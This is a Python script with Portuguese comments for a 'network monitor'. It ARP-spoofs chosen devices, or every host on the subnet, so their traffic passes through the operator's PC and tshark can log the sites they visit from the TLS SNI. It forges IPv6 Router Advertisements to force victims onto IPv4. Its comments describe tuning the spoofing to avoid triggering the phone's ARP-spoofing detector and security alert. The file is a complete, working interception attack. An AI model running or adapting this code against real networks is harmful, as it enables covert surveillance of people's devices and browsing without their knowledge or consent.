"""
ARP spoofing para o Monitor de Rede.

Faz o PC se anunciar como gateway para o(s) dispositivo(s) monitorado(s),
de forma que o trafego deles passe por este PC (onde o tshark le o SNI).

Mantem a internet do alvo funcionando (IP forwarding deve estar ligado no SO).
Ao encerrar (Ctrl+C / terminate), restaura as tabelas ARP.

Uso:
    python arp_spoof.py --gateway 192.168.1.1 --victims 192.168.1.50,192.168.1.51
    python arp_spoof.py --gateway 192.168.1.1 --victims all   (varre a sub-rede)

Imprime linhas de status em stdout (consumidas pelo Node):
    READY|<gateway_mac>
    SPOOF|<victim_ip>|<victim_mac>
    WARN|<mensagem>
    ERROR|<mensagem>
"""
import argparse
import os
import sys
import time
import signal
import threading
import subprocess
import ctypes

# Silencia avisos verbosos do scapy no import.
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import (  # noqa: E402
    ARP, Ether, srp, send, sendp, conf, get_if_hwaddr,
    IPv6, ICMPv6ND_RA, ICMPv6ND_RS, getmacbyip6,
)

ALL_NODES_IP6 = "ff02::1"
ALL_NODES_MAC = "33:33:00:00:00:01"
ALL_ROUTERS_IP6 = "ff02::2"
ALL_ROUTERS_MAC = "33:33:00:00:00:02"


def log(kind, *parts):
    print(kind + "|" + "|".join(str(p) for p in parts), flush=True)


def get_mac(ip, timeout=3, retries=2):
    """Resolve o MAC de um IP via ARP request. None se nao responder."""
    for _ in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=timeout,
                verbose=False,
            )
            for _, rcv in ans:
                return rcv[Ether].src
        except Exception as e:  # noqa: BLE001
            log("WARN", f"falha ao resolver MAC de {ip}: {e}")
    return None


def scan_subnet(gateway_ip, timeout=3):
    """Varre a sub-rede /24 do gateway e devolve IPs ativos (exceto o gateway e este PC)."""
    base = ".".join(gateway_ip.split(".")[:3]) + ".0/24"
    log("WARN", f"varrendo {base} ...")
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=base),
            timeout=timeout,
            verbose=False,
        )
    except Exception as e:  # noqa: BLE001
        log("WARN", f"varredura falhou: {e}")
        return []
    my_ip = conf.route.route(gateway_ip)[1]
    found = []
    for _, rcv in ans:
        ip = rcv[ARP].psrc
        if ip != gateway_ip and ip != my_ip:
            found.append(ip)
    return found


def spoof(target_ip, target_mac, spoof_ip, my_mac=None):
    """
    Diz SÓ ao alvo (unicast) que spoof_ip (o gateway) está no NOSSO MAC.

    Enviamos UNICAST direto ao celular (Ether.dst = target_mac), nunca broadcast.
    Assim só o celular é afetado e a "pegada" é mínima — o `send()` em L3 do scapy
    manda em BROADCAST, que envenena a rede toda e dispara com muito mais facilidade
    o detector de ARP spoofing do celular (o "Alerta de segurança de Wi-Fi").
    """
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    if my_mac:
        sendp(Ether(src=my_mac, dst=target_mac) / arp, verbose=False)
    else:
        send(arp, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, count=5):
    """
    Corrige a tabela ARP do ALVO para "source_ip está no source_mac" (ex.: diz ao
    celular o MAC REAL do gateway).

    TODOS os frames saem com o NOSSO MAC como origem Ethernet — é o único jeito
    que o Wi-Fi entrega de fato (o capture mostrou que MAC de origem "estranho"
    vira frame malformado com origem 00:00:00:00:00:00). O Android/Linux atualiza
    a tabela pelo CONTEÚDO do ARP (psrc/hwsrc), não pelo Ether.src — foi assim que
    o próprio envenenamento funcionou.

    Enviamos 3 formas; a mais forte é o REQUEST (op=1): ao receber um pedido ARP
    "vindo de" source_ip, o alvo é OBRIGADO a gravar source_ip->source_mac.

    IMPORTANTE: definimos Ether.src = NOSSO MAC explicitamente. Sem isso, o sendp()
    manda o frame com origem 00:00:00:00:00:00 (malformado), que o celular/AP
    descarta — foi esse o bug que impedia a restauração de "pegar".
    """
    try:
        my_mac = get_if_hwaddr(conf.iface)
    except Exception:  # noqa: BLE001
        my_mac = None

    def eth(dst):
        return Ether(src=my_mac, dst=dst) if my_mac else Ether(dst=dst)

    frames = [
        # 1) REQUEST "de" source_ip perguntando pelo alvo -> força a atualização.
        eth(target_mac) / ARP(op=1, pdst=target_ip, hwdst=target_mac,
                              psrc=source_ip, hwsrc=source_mac),
        # 2) REPLY unicast: "source_ip está no source_mac".
        eth(target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                              psrc=source_ip, hwsrc=source_mac),
    ]
    # Só unicast direto ao celular (sem broadcast gratuito): o broadcast é o que
    # mais dispara o detector de ARP do celular; e a correção só interessa a ele.
    for f in frames:
        try:
            sendp(f, count=count, verbose=False)
        except Exception:  # noqa: BLE001
            pass


def start_watchdog(iface, gateway_ip, gateway_mac, victims, gw6=None, our_mac=None):
    """
    Inicia um processo vigia DESACOPLADO que restaura o ARP (e reativa o IPv6) se
    este processo morrer de forma abrupta (janela fechada, kill, travamento). É a
    garantia de que a internet do celular não cai mesmo que a limpeza normal falhe.

    Roda sem console e fora do grupo de processos da janela, então sobrevive ao
    fechamento do PowerShell.
    """
    script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "arp_watchdog.py")
    if not os.path.exists(script):
        log("WARN", "vigia de rede não encontrado (arp_watchdog.py)")
        return None
    victims_arg = ";".join(f"{ip}={mac}" for ip, mac in victims.items())
    cmd = [
        sys.executable, script,
        "--ppid", str(os.getpid()),
        "--gateway", gateway_ip,
        "--gateway-mac", gateway_mac,
        "--victims", victims_arg,
    ]
    if iface:
        cmd += ["--iface", iface]
    if gw6 and our_mac:
        cmd += ["--gw6", gw6, "--our-mac", our_mac]
    # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW: sem console
    # e em grupo próprio. CREATE_BREAKAWAY_FROM_JOB: escapa de um "Job" que mate
    # a árvore ao fechar a janela (o Windows Terminal às vezes usa um). Se o Job
    # não permitir o breakaway, o CreateProcess falha -> tentamos de novo sem ele.
    DETACHED, NEWGRP, NOWINDOW, BREAKAWAY = 0x00000008, 0x00000200, 0x08000000, 0x01000000
    base_flags = DETACHED | NEWGRP | NOWINDOW if sys.platform == "win32" else 0

    def _spawn(creationflags):
        kwargs = {}
        if sys.platform == "win32":
            kwargs["creationflags"] = creationflags
        devnull = open(os.devnull, "wb")
        return subprocess.Popen(
            cmd, stdin=subprocess.DEVNULL, stdout=devnull, stderr=devnull,
            close_fds=True, **kwargs,
        )

    proc = None
    if sys.platform == "win32":
        try:
            proc = _spawn(base_flags | BREAKAWAY)
        except Exception:  # noqa: BLE001 — Job sem permissão de breakaway
            proc = None
    try:
        if proc is None:
            proc = _spawn(base_flags)
        log("WARN", f"vigia de rede ativo (pid {proc.pid}) — a internet do celular fica protegida")
        return proc
    except Exception as e:  # noqa: BLE001
        log("WARN", f"não consegui iniciar o vigia de rede: {e}")
        return None


# --------------------------------------------------------------------------
# IPv6 — "forçar IPv4": suprime o roteador IPv6 (RA com lifetime 0).
# --------------------------------------------------------------------------

def ra_kill(router_ll, our_mac):
    """
    Envia um Router Advertisement FORJADO, como se viesse do roteador
    (router_ll, ex.: fe80::1), anunciando Router Lifetime = 0. Os aparelhos
    removem o roteador IPv6 como rota padrão e passam a usar IPv4 para a
    internet — que o ARP intercepta de forma confiável.

    hlim=255 é obrigatório para pacotes NDP (senão os aparelhos descartam).
    Enviado ao multicast de todos os nós (ff02::1).
    """
    pkt = (
        Ether(src=our_mac, dst=ALL_NODES_MAC)
        / IPv6(src=router_ll, dst=ALL_NODES_IP6, hlim=255)
        / ICMPv6ND_RA(routerlifetime=0, M=0, O=0)
    )
    sendp(pkt, verbose=False)


def ra_restore(router_ll, our_mac):
    """
    Reativa o IPv6 de forma SEGURA: NÃO forja um RA (um RA incompleto forjado faz
    o Android/MIUI reconfigurar a interface e derrubar até o IPv4 — foi o que
    quebrou tudo). Em vez disso, envia um Router Solicitation com origem "::":
    pela RFC 4861 o roteador real é OBRIGADO a responder com o seu RA verdadeiro
    e completo em MULTICAST (ff02::1), que chega ao celular e restaura o IPv6
    direito — sem nós inventarmos nada.
    """
    if not our_mac:
        return
    rs = (
        Ether(src=our_mac, dst=ALL_ROUTERS_MAC)
        / IPv6(src="::", dst=ALL_ROUTERS_IP6, hlim=255)
        / ICMPv6ND_RS()
    )
    try:
        sendp(rs, count=3, verbose=False)
    except Exception:  # noqa: BLE001
        pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--gateway", required=True)
    ap.add_argument("--victims", required=True, help="IPs separados por virgula, ou 'all'")
    # Intervalo maior = menos pacotes ARP = menor chance de disparar o detector de
    # ARP spoofing do celular. Enquanto há tráfego, a entrada envenenada do celular
    # se mantém "viva" sozinha; só re-enviamos para cobrir períodos ociosos.
    ap.add_argument("--interval", type=float, default=6.0)
    ap.add_argument("--gw6", default=None, help="gateway IPv6 (ex.: fe80::1) para NDP spoofing")
    ap.add_argument("--gw6-mac", dest="gw6_mac", default=None, help="MAC real do gateway IPv6")
    ap.add_argument("--our-mac", dest="our_mac", default=None, help="MAC desta placa de rede")
    ap.add_argument("--iface", default=None, help="nome da interface (ex.: Wi-Fi)")
    args = ap.parse_args()

    # Fixa a interface do scapy (necessario para link-local IPv6).
    if args.iface:
        try:
            conf.iface = args.iface
        except Exception as e:  # noqa: BLE001
            log("WARN", f"nao consegui fixar a interface '{args.iface}': {e}")

    # Nosso MAC de placa — usado para enviar o envenenamento em UNICAST direto ao
    # celular (menor pegada, menos chance de disparar o detector do celular).
    try:
        my_mac = get_if_hwaddr(conf.iface)
    except Exception:  # noqa: BLE001
        my_mac = None

    gateway_ip = args.gateway
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        log("ERROR", f"nao consegui resolver o MAC do gateway {gateway_ip}")
        sys.exit(1)
    log("READY", gateway_mac)

    # --- Preparo do IPv6: "forçar IPv4" (RA com lifetime 0) ---
    # Precisamos do nosso MAC (origem L2) e do link-local do roteador (origem L3
    # forjada). Nao precisamos do MAC do roteador aqui.
    our_mac = args.our_mac
    if our_mac:
        our_mac = our_mac.replace("-", ":").lower()

    if args.gw6:
        if not our_mac:
            try:
                our_mac = get_if_hwaddr(conf.iface)
            except Exception as e:  # noqa: BLE001
                log("WARN", f"sem MAC local: {e}")
        if our_mac:
            log("READY6", args.gw6)
        else:
            log("WARN", "sem MAC local; supressao de IPv6 desativada")
            args.gw6 = None

    # Resolve os alvos.
    if args.victims.strip().lower() == "all":
        victim_ips = scan_subnet(gateway_ip)
        if not victim_ips:
            log("ERROR", "nenhum dispositivo encontrado na varredura")
            sys.exit(1)
    else:
        victim_ips = [v.strip() for v in args.victims.split(",") if v.strip()]

    victims = {}  # ip -> mac
    for ip in victim_ips:
        mac = get_mac(ip)
        if mac:
            victims[ip] = mac
            log("SPOOF", ip, mac)
        else:
            log("WARN", f"alvo {ip} nao respondeu ao ARP (ignorado)")

    if not victims:
        log("ERROR", "nenhum alvo valido para interceptar")
        sys.exit(1)

    # Rede à prova de falhas: um vigia desacoplado restaura o ARP (e o IPv6) se
    # este processo morrer de forma abrupta (janela fechada, kill, travamento).
    start_watchdog(args.iface, gateway_ip, gateway_mac, victims, args.gw6, our_mac)

    running = {"v": True}
    restored = {"done": False}

    def restore_all():
        # Desfaz o envenenamento: diz ao celular o MAC REAL do gateway. Como só
        # envenenamos o celular (meia-direção), basta corrigir o lado do celular —
        # o roteador nunca foi mexido. Idempotente — roda uma vez só. Rajada de
        # rodadas porque em Wi-Fi um pacote pode se perder.
        if restored["done"]:
            return
        restored["done"] = True
        for _ in range(3):
            for ip, mac in victims.items():
                restore(ip, mac, gateway_ip, gateway_mac)
        # Reativa o IPv6 na hora (senão apps que preferem IPv6/QUIC não abrem).
        if args.gw6 and our_mac:
            ra_restore(args.gw6, our_mac)

    def stop(signum=None, frame=None):
        running["v"] = False

    signal.signal(signal.SIGINT, stop)
    try:
        signal.signal(signal.SIGTERM, stop)
    except Exception:  # noqa: BLE001
        pass

    # FECHAMENTO DA JANELA (Windows): ao fechar o console, o SO mata os processos
    # sem rodar o 'finally'. Um handler de console restaura o ARP NA HORA, para o
    # celular não ficar sem internet. (CTRL_C=0, BREAK=1, CLOSE=2, LOGOFF=5, SHUTDOWN=6.)
    _kept_handlers = []
    if sys.platform == "win32":
        try:
            PHANDLER = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_uint)

            def _console_handler(ctrl_type):
                try:
                    log("WARN", "encerrando (console) — restaurando ARP...")
                    restore_all()
                except Exception:  # noqa: BLE001
                    pass
                running["v"] = False
                return 1  # tratado (a limpeza já rodou)

            cb = PHANDLER(_console_handler)
            _kept_handlers.append(cb)  # mantém referência viva
            ctypes.windll.kernel32.SetConsoleCtrlHandler(cb, True)
        except Exception as e:  # noqa: BLE001
            log("WARN", f"sem handler de console: {e}")

    # stdin: parada educada pedida pelo Node (escreve 'stop' ou fecha o stdin).
    def watch_stdin():
        try:
            for _ in sys.stdin:
                break
        except Exception:  # noqa: BLE001
            pass
        running["v"] = False

    threading.Thread(target=watch_stdin, daemon=True).start()

    try:
        while running["v"]:
            # IPv4 (ARP) — MEIA-DIREÇÃO: envenenamos SÓ o celular ("o gateway sou
            # eu"), para o tráfego de SUBIDA (onde está o SNI) passar pelo PC. NÃO
            # envenenamos o roteador: a resposta vai direto ao celular, e — crucial
            # — não criamos um cache no roteador que depois não conseguimos desfazer
            # (roteador ignora ARP não-solicitado; só a correção do celular basta).
            for ip, mac in victims.items():
                spoof(ip, mac, gateway_ip, my_mac)  # alvo: "o gateway sou eu" (unicast)
            # IPv6: suprime o roteador (RA lifetime 0) -> tudo cai no IPv4.
            if args.gw6:
                ra_kill(args.gw6, our_mac)
            time.sleep(args.interval)
    finally:
        log("WARN", "restaurando tabelas (ARP + IPv6)...")
        restore_all()  # ARP dos alvos/roteador + reativação imediata do IPv6
        log("WARN", "tabelas restauradas. Encerrado.")


if __name__ == "__main__":
    main()
